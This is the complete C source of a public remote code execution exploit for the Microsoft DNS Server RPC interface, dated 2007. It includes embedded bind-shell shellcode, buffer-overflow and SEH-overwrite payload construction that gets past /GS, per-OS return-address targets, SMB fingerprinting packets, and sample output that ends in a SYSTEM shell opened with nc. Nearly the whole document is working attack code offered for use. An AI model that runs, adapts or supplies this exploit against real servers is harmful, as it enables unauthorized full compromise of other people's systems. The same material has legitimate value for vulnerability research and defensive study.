/* Microsoft DNS Server Remote Code execution Exploit
   Advisory: http://www.microsoft.com/technet/security/advisory/935964.mspx
   This remote exploit works by default against port 445 (and also dynamic rpc ports)
   Vulnerability analysis included. check the dissasembles.txt file

  Author:
  * Mario Ballano  ( mballano~gmail.com )  
  * Andres Tarasco ( atarasco~gmail.com )
   
  Timeline:
  * April,12,2007: Microsoft advisory published
  * April,13,2007: POC Exploit coded
  * April,14,2007: Microsoft notified about a new attack vector against port 445 (this exploit code)
  * April,14,2007: Working exploit for Windows 2000 server SP4 (Spanish)
  * April,15,2007: Working exploit for Windows 2003 server SP2 (Spanish) /GS bypassed 
  * Appri,17,2007: Exploit code updated with some new features + bugfixes
  * April,xx,2007: hackers hax the w0rld and got busted.
  * April,xx,2007: Lammer release the first buggy worm : W32.Rinbot.BC 
  * xxxxx,xx,2007: Finally it was true. Nacked photos of Gary m.. being abducted were found at NSA servers
  
  Exploit v2 features:
  - Target Remote port 445 (by default but requires auth)
  - Manual target for dynamic tcp port (without auth)
  - Automatic search for dynamic dns rpc port
  - Local and remote OS fingerprinting (auto target)
  - Windows 2000 server and Windows 2003 server (Spanish) supported by default
  - Fixed bug with Windows 2003 Shellcode
  - Universal local exploit for Win2k (automatic search for opcodes)
  - Universal local and remote exploit for Win2k3 (/GS bypassed only with DEP disabled)
  - Added targets for remote win2k English and italian (not tested, found with metasploit opcode database. please report your owns)
  - Microsoft RPC api used ( who cares? :p )


  IMPORTANT: Some people told us that the exploit code does not work for Windows 2003, 

   This exploit bypass /GS mainly as an exercise for us, but unfortunatelly doesn´t 
   bypass DEP, if you can do it please, show us how, the whole community is 
   waiting for it :-).
  
  
  Example:

   D:\DNSTEST>dnstest.exe
    --------------------------------------------------------------
    Microsoft Dns Server local & remote RPC Exploit code (port 445)
    Exploit code by Andres Tarasco & Mario Ballano
    Tested against Windows 2000 server SP4 and Windows 2003 SP2
    --------------------------------------------------------------

    Usage:   dnstest.exe -h 127.0.0.1 (Universal local exploit)
             dnstest.exe -h host [-t id] [-p port]
    Targets:
         0 (0x30270B0B) - Win2k3 server SP2 Spanish - (default for win2k3)
         1 (0x79467ef8) - Win2k  server SP4 Spanish - (default for win2k )
         2 (0x7c4fedbb) - Win2k  server SP4 English
         3 (0x7963edbb) - Win2k  server SP4 Italian
         4 (0x41414141) - Windows all Denial of Service

   D:\DNSTEST>dnstest.exe -h 192.168.1.7
    --------------------------------------------------------------
    Microsoft Dns Server local & remote RPC Exploit code (port 445)
    Exploit code by Andres Tarasco & Mario Ballano
    Tested against Windows 2000 server SP4 and Windows 2003 SP2
    --------------------------------------------------------------

   [+] Trying to fingerprint target.. 05 02
   [+] Remote Host identified as Windows 2003
   [+] Connecting to 50abc2a4-574d-40b3-9d66-ee4fd5fba076@ncacn_np:192.168.1.7[\\pipe\\dnsserver]
   [+] RpcBindingFromStringBinding success
   [+] Selected target 0x7FFc07A4
   [+] Sending Exploit code to DnssrvOperation()
   [+] Now try to connect to port 4444


  D:\DNSTEST>nc 192.168.1.7 4444
   Microsoft Windows [Version 5.2.3790]
   (C) Copyright 1985-2003 Microsoft Corp.

   C:\WINDOWS\system32>whoami
   nt authority\system  

  
  * References:
  - Defeating the Stack Based Buffer Overflow Prevention Mechanism of Microsoft Windows 2003 Server. (David Litchfield, NGSSoftware).
  - Sir Dystic Rpcdump
  - www.48bits.com
  - http://www.514.es

  Just compile the code with nmake and have fun!
*/
#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include "dnsxpl.h"
#include <winsock.h>
#pragma comment(lib,"ws2_32")

void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len){ return(malloc(len)); }
void __RPC_USER midl_user_free(void __RPC_FAR * ptr){ free(ptr); }
int fingerprint (char *host);    //Fingerprint remote os for autotarget
BYTE * find_jmp (BYTE *lpAddress, DWORD dwSize); //Search for opcodes
void FillPaddedOffset(unsigned char *data, DWORD offset); //Write a DWORD padded with '\'


unsigned char shellcode2k[] = /* Bindshell 4444 */
"\x29\xc9\x83\xe9\xb0\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x18"
"\xc3\x99\x10\x83\xee\xfc\xe2\xf4\xe4\xa9\x72\x5d\xf0\x3a\x66\xef"
"\xe7\xa3\x12\x7c\x3c\xe7\x12\x55\x24\x48\xe5\x15\x60\xc2\x76\x9b"
"\x57\xdb\x12\x4f\x38\xc2\x72\x59\x93\xf7\x12\x11\xf6\xf2\x59\x89"
"\xb4\x47\x59\x64\x1f\x02\x53\x1d\x19\x01\x72\xe4\x23\x97\xbd\x38"
"\x6d\x26\x12\x4f\x3c\xc2\x72\x76\x93\xcf\xd2\x9b\x47\xdf\x98\xfb"
"\x1b\xef\x12\x99\x74\xe7\x85\x71\xdb\xf2\x42\x74\x93\x80\xa9\x9b"
"\x58\xcf\x12\x60\x04\x6e\x12\x50\x10\x9d\xf1\x9e\x56\xcd\x75\x40"
"\xe7\x15\xff\x43\x7e\xab\xaa\x22\x70\xb4\xea\x22\x47\x97\x66\xc0"
"\x70\x08\x74\xec\x23\x93\x66\xc6\x47\x4a\x7c\x76\x99\x2e\x91\x12"
"\x4d\xa9\x9b\xef\xc8\xab\x40\x19\xed\x6e\xce\xef\xce\x90\xca\x43"
"\x4b\x90\xda\x43\x5b\x90\x66\xc0\x7e\xab\x88\x4c\x7e\x90\x10\xf1"
"\x8d\xab\x3d\x0a\x68\x04\xce\xef\xce\xa9\x89\x41\x4d\x3c\x49\x78"
"\xbc\x6e\xb7\xf9\x4f\x3c\x4f\x43\x4d\x3c\x49\x78\xfd\x8a\x1f\x59"
"\x4f\x3c\x4f\x40\x4c\x97\xcc\xef\xc8\x50\xf1\xf7\x61\x05\xe0\x47"
"\xe7\x15\xcc\xef\xc8\xa5\xf3\x74\x7e\xab\xfa\x7d\x91\x26\xf3\x40"
"\x41\xea\x55\x99\xff\xa9\xdd\x99\xfa\xf2\x59\xe3\xb2\x3d\xdb\x3d"
"\xe6\x81\xb5\x83\x95\xb9\xa1\xbb\xb3\x68\xf1\x62\xe6\x70\x8f\xef"
"\x6d\x87\x66\xc6\x43\x94\xcb\x41\x49\x92\xf3\x11\x49\x92\xcc\x41"
"\xe7\x13\xf1\xbd\xc1\xc6\x57\x43\xe7\x15\xf3\xef\xe7\xf4\x66\xc0"
"\x93\x94\x65\x93\xdc\xa7\x66\xc6\x4a\x3c\x49\x78\xe8\x49\x9d\x4f"
"\x4b\x3c\x4f\xef\xc8\xc3\x99\x10";

int local=1; //local/remote exploit flag
int lang=-1; //language and version flag for remote exploit
int SearchDynamicPort=1;

struct _targets { 
   char *version;
   DWORD offset;


} TARGETS[] = { //supported os
{ "Win2k3 server SP2 Universal - (default for win2k3)",0x30270B0B}, //default - UnicodeNLSOffset  Universal unicode.nls 
{ "Win2k  server SP4 Spanish -   (default for win2k )",0x79467EF8}, //default - kernel32.dll spanish offset 
{ "Win2k  server SP4 English",                       0x7c4fedbb}, //kernel32 English / 5.0.2195.6688) (from metasploit db, not tested)
{ "Win2k  server SP4 Italian",                       0x7963edbb}, //kernel32 English / 5.0.2195.6688) (from metasploit db, not tested)
{ "Windows all Denial of Service",                   0x41414141}, //DOS
/* more versions here.... */
};


void usage(char *argv) {
int i;
   printf(" Usage:   %s -h 127.0.0.1 (Universal local exploit)\n",argv);
   printf("          %s -h host [-t id] [-p port]\n",argv);
   printf(" Targets:\n");
   for(i=0;i<sizeof(TARGETS)/sizeof(struct _targets);i++) {
      printf("      %i (0x%8.8x) - %s\n",i,TARGETS[i].offset,TARGETS[i].version);
   }
   exit(1);    
}
               
char *DiscoverPort(char *host, char *uid) {
/* Idea ripped from Sir Dystic Rpcdump */
   unsigned char pszStringBinding[256];
   UUID uuid;
   RPC_EP_INQ_HANDLE context;
   RPC_IF_ID id;
   RPC_BINDING_HANDLE handle, handle2;
   unsigned char * ptr;
   unsigned char * ptr2;
   unsigned char * ptr3;

   sprintf(pszStringBinding,"ncacn_ip_tcp:%s",host); //Construct binding
   if (RpcBindingFromStringBinding(pszStringBinding, &handle) == RPC_S_OK) {
      printf("[+] Binding to %s\n",pszStringBinding);
      if (RpcMgmtEpEltInqBegin( handle, RPC_C_EP_ALL_ELTS, NULL, 0, &uuid, &context)== RPC_S_OK)  {
         while ( RpcMgmtEpEltInqNext(context, &id, &handle2, &uuid, &ptr) == RPC_S_OK) {
            UuidToString(&id.Uuid, &ptr2);
            if (strcmp("50abc2a4-574d-40b3-9d66-ee4fd5fba076",ptr2)==0) {
               char *p;
               RpcBindingToStringBinding(handle2, &ptr3);
               printf("[+] Found %s version %u.%u\n", ptr2, id.VersMajor, id.VersMinor);
               printf("[+] RPC binding string: %s\n", ptr3);
               p=strchr(ptr3,'[');
               if (p) {
                  RpcStringFree(&ptr2);
                  p[strlen(p)-1]='\0';
                  return(p+1);
               }             
            }
            RpcStringFree(&ptr2);                                
            if (handle2 != NULL) RpcBindingFree(&handle2);
            if (ptr != NULL)  RpcStringFree(&ptr);
         }
      }
   }
   return(NULL);
}


void __cdecl main(int argc, char *argv[])
{
   RPC_STATUS status;
   unsigned char * pszUuid				 = "50abc2a4-574d-40b3-9d66-ee4fd5fba076";
   unsigned char * pszProtocolSequence = "ncacn_np";
   unsigned char * pszNetworkAddress	 = NULL;
   unsigned char * pszEndpoint			 = "\\pipe\\dnsserver";
   unsigned char * pszOptions			 = NULL;
   unsigned char * pszStringBinding	 = NULL;
   unsigned long ulCode;
   int os;
   int i;
         
   printf(" --------------------------------------------------------------\n");
   printf(" Microsoft Dns Server local & remote RPC Exploit code\n");
   printf(" Exploit code by Andres Tarasco & Mario Ballano\n");
   printf(" Tested against Windows 2000 server SP4 and Windows 2003 SP2\n");
   printf(" --------------------------------------------------------------\n\n");
   
   
 if (argc==1) usage(argv[0]); //Handle parameters
 for(i=1;i<argc;i++) {
      if ( (argv[i][0]=='-') ) {
         switch (argv[i][1]) {
         case 'h':
            pszNetworkAddress=argv[i+1];
            break;
         case 't':
         case 'T':
            lang=atoi(argv[i+1]);
            break;
         case 'p':
            if (strcmp(argv[i+1],"445")==0) {
               printf("[+] Attacking default port 445 (should require auth)\n");
            } else {
               pszEndpoint=argv[i+1];
               pszProtocolSequence="ncacn_ip_tcp";
            }
            SearchDynamicPort=0;
            break;             
         default:
            printf("[-] Invalid argument: %s\n",argv[i]);
            usage(argv[0]);
            break;
         }
         i++;            
      } else usage(argv[0]);
   }
   
   if (pszNetworkAddress==NULL) usage(argv[0]);
   //Test if the remote server is supported (2k & 2k3)
   os=fingerprint(pszNetworkAddress);

   if (os==-1)  {
      printf("[-] Unable to fingerprint remote Host\n");
      exit(-1);
   } else {
      switch (os) {
      case 0:  printf("[+] Remote Host identified as Windows 2000\n"); 
               if (lang==-1) lang=1; //set default target for Windows 2000
         break;
      case 1:  printf("[-] Remote Host identified as Windows XP\n"); exit(1); break;
      case 2:  printf("[+] Remote Host identified as Windows 2003\n"); 
               if (lang==-1) lang=0; //set default target for Windows 2003
         break;
      default: printf("[-] Unknown Remote Host OS\n");exit(1); break;
      }
   }   


   if (SearchDynamicPort) { //Do some magic stuff here =)
      char *port=NULL;
      printf("[-] No port selected. Trying Ninja sk1llz\n");
      port=DiscoverPort(pszNetworkAddress,"50abc2a4-574d-40b3-9d66-ee4fd5fba076");
      if (port) {
         printf("[+] Dynamic DNS rpc port found (%s)\n",port);
         pszEndpoint=port;
         pszProtocolSequence="ncacn_ip_tcp";
      } else {
         printf("[-] Unable to find dynamic dns port (trying default 445)\n");
      }
   }
       

   //Create an RPC binding string
   status = RpcStringBindingCompose(pszUuid,pszProtocolSequence,pszNetworkAddress,pszEndpoint,pszOptions,&pszStringBinding);
   printf("[+] Connecting to %s\n", pszStringBinding);
   
   if (status==RPC_S_OK) {
      status = RpcBindingFromStringBinding(pszStringBinding,&dns); //RPC Binding
      if (status==RPC_S_OK) { 
         wchar_t *parama=L"PARAMAA"; //Rpc call parameter1
         unsigned char *paramb=NULL; //Rpc call parameter2 that triggers overflow
         unsigned char *paramc="PARAMC";//Rpc call parameter3
         long	*paramd = malloc(50); //Rpc call parameter4
         long *parame=malloc(50);	 //rpc call paramameter5	
         int i,j;
         long ret;       

         printf("[+] RpcBindingFromStringBinding success\n");                
         if (os==0) { //Windows 2000 Server exploit 
            #define BUFSIZE (0x3A2 +8 +24 +sizeof(shellcode2k)*2) //buffer + EIP + PAD + Shellcode
            
            paramb=malloc(BUFSIZE +1);  //Alloc needed space
            memset(paramb,'\\',BUFSIZE); //Fill the whole buffer with \
            
            for(i=0;i<=0x3A2;i+=2) { //0x3A2 chars needed to trigger the overflow 
               paramb[i+1]='a';
            }               
            
            if (local) { //universal local exploit for Windows 2000
               unsigned char *pos=(DWORD *)GetModuleHandle("kernel32.dll"); //Get Memory address for kernel32.dll
               DWORD Off2popAndRet;             
               printf("[+] Searching local opcodes at Kernel32.dll (0x%8.8x)\n",pos);
               Off2popAndRet = (DWORD) find_jmp(pos,0x100000); //search kernel32.dll memory for valid opcodes
               if(Off2popAndRet) { //Valid opcode found
                  FillPaddedOffset(&paramb[0x3a2],Off2popAndRet); //fill buffer with found address
                  printf("[+] Please report this offset to us so we can update the exploit =)\n");
               } else {
                  printf("[-] Unable to locate valid opcodes\n");
                  exit(-1);
               }              
            } else { //overwrite EIP with selected return address ( default 0x79467EF8 kernel32.dll call esp )              
              FillPaddedOffset(&paramb[0x3a2],TARGETS[lang].offset); //fill buffer with selected opcode
              printf("[+] Selected target 0x%8.8x\n",TARGETS[lang].offset);
            }
            
            //Pad with 3 DWORDS (our shellcode is at ESP, 12 bytes above)
            memcpy(&paramb[0x3a2+8],"\\a\\a\\a\\a\\b\\b\\b\\b\\c\\c\\c\\c",24);
            
            i=0x3a2+8+24; //set the possition for our shellcode
            for(j=0;j<sizeof(shellcode2k);j++) {
               paramb[i+1]=shellcode2k[j]; //add the shellcode to the buffer
               i+=2;
            }               
            paramb[BUFSIZE]='\0';            
            
         } else { //Windows 2003 server exploit. Overwrite SEH handler
            #undef  BUFSIZE
            #define BUFSIZE 10000
            #define SEH_HANDLER_DELTA 0x661 

			

		    /* Indeed the real offset is 0x00270B0B, 
			   but 0x30 -> '0', and extractQuotedchar should do 
			   the trick for us :-), so we can have NULL bytes in the offset */
                         
            paramb=malloc(BUFSIZE +1); 													               
            memset (paramb,'\\',BUFSIZE);

            for( i=0 ; i< BUFSIZE; i+=2 ) {									
               paramb[i+1]='a';					
            }
                                    
            FillPaddedOffset(&paramb[SEH_HANDLER_DELTA*2-8],0x04EB9090); //Adding jmp $ + 6  // 90 90 EB 04
			   FillPaddedOffset(&paramb[SEH_HANDLER_DELTA*2],TARGETS[lang].offset);                        
            i=SEH_HANDLER_DELTA*2+8;
            for(j=0;j<sizeof(shellcode2k)-1;j++) {
               paramb[i+1]=shellcode2k[j]; //add the Shellcode
               i+=2;
            }               
            paramb[BUFSIZE]='\0';           
         }

         printf("[+] Sending Exploit code to DnssrvOperation()\n");
         printf("[+] Now try to connect to port 4444\n");
         RpcTryExcept {					              
            ret=DnssrvQuery(parama,paramb,paramc,paramd,parame) ; //send the overflow call
            printf("[-] Return code: %i\r",ret);
         }				 
         RpcExcept(1) {
            ulCode = RpcExceptionCode(); //Show returned errors from remote DNS server
            printf("[-] RPC Server reported exception 0x%lx = %ld\n", ulCode, ulCode);
            switch (ulCode) {
            case 5: printf("[-] Access Denied, authenticate first with \"net use \\\\%s pass /u:user\"\n",pszNetworkAddress);break;
            case 1722:printf("[-] Looks like there is no remote dns server\n"); break;
            case 1726:printf("[-] Looks like remote RPC server crashed :/\n"); break; 
            default:	break;         
            }
         }
         RpcEndExcept		
      } else {
         printf("[+] RpcBindingFromStringBinding returned 0x%x\n", status);
      }
   }
}


/******************************************************************************************************/
BYTE * find_jmp (BYTE *lpAddress, DWORD dwSize)
{	
   DWORD i;
   BYTE *p;
   BYTE *retval = NULL;	
   
   printf("[+] Searching 0x%x bytes\n",dwSize);
   
   for (i=0;i<(dwSize-4);i++)
   {
      p = lpAddress + i;      

     if (p[0]==0xFF) { //Todo: Validate Not Null bytes
        if (p[1]==0xD4) {
           printf("[+] Opcode \" call esp\" found at address 0x%8.8x\n",p);
           retval=p;	
           break;
        } else if (p[1]==0xE4) {
           printf("[+] Opcode \" jmp esp\" at address 0x%8.8\n",p);
           retval=p;
           break;
        }
      } 
   }   
   return retval;
}
/******************************************************************************************************/
int fingerprint (char *host) {
   char req1[] =
      "\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8"
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe"
      "\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f"
      "\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02"
      "\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x57\x69\x6e\x64\x6f"
      "\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70"
      "\x73\x20\x33\x2e\x31\x61\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30"
      "\x32\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54"
      "\x20\x4c\x4d\x20\x30\x2e\x31\x32";
   char req2[] =
      "\x00\x00\x00\xa4\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x18\x07\xc8"
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe"
      "\x00\x00\x10\x00\x0c\xff\x00\xa4\x00\x04\x11\x0a\x00\x00\x00\x00"
      "\x00\x00\x00\x20\x00\x00\x00\x00\x00\xd4\x00\x00\x80\x69\x00\x4e"
      "\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00\x00\x97\x82\x08\xe0\x00"
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
      "\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00"
      "\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x32\x00\x31\x00\x39\x00"
      "\x35\x00\x00\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00"
      "\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x35\x00"
      "\x2e\x00\x30\x00\x00\x00\x00";
   
   WSADATA ws;   
   int sock;
   struct sockaddr_in remote;   
   unsigned char buf[0x300];
   int i;
   OSVERSIONINFO os;

   if (strcmp(host,"127.0.0.1")!=0) local=0;
   
   if (local) {
      os.dwOSVersionInfoSize =sizeof(OSVERSIONINFO);
      GetVersionEx(&os);
      //printf("OS: %i - %i\n",os.dwMajorVersion, os.dwMinorVersion);
      
      if (os.dwMajorVersion==5) return (os.dwMinorVersion);
      else return(-1);
   }
   if (WSAStartup(MAKEWORD(2,0),&ws)!=0) {
      printf("[-] WsaStartup() failed\n");
      exit(1);
   }
   //NetWkstaGetInfo 
   remote.sin_family = AF_INET;
   remote.sin_addr.s_addr = inet_addr(host);
   remote.sin_port = htons(445);	  
   sock=socket(AF_INET, SOCK_STREAM, 0);
   printf("[+] Trying to fingerprint target.. ");
   
   if (connect(sock,(struct sockaddr *)&remote, sizeof(remote))>=0) {
      if (send(sock, req1, sizeof(req1),0) >0) {
         if (recv(sock, buf, sizeof (buf), 0) > 0) {
            if (send(sock, req2, sizeof(req2),0) >0) {
               i=recv(sock, buf, sizeof (buf), 0);
               if (i>0) {
                  printf("(%2.2x.%2.2x)\n",buf[0x60-1], buf[0x60]);
                  if (buf[0x60-1]==5) {
                     return(buf[0x60]);
                  } else {
                     printf("\n[-] Unssuported OS\n");
                  }
               } else {
                  printf("\n[-] Recv2 failed\n");
               }
            } else {
               printf("\n[-] Send2 failed\n");
            }
         } else {
            printf("\n[-] Recv failed\n");
         }
      } else {
         printf("\n[-] Send failed\n");
      }
   } else {
      printf("\n[-] Connect failed\n");
   }
   return(-1);
}


void FillPaddedOffset(unsigned char *data, DWORD offset) {
   // write return Address/DWORD to the buffer
   data[1]  =(unsigned char)  offset & 0xFF;
   data[3]  =(unsigned char) (offset >>8 ) & 0xFF;
   data[5]  =(unsigned char) (offset >> 16 ) & 0xFF;
   data[7]  =(unsigned char) (offset>> 24 ) & 0xFF;
}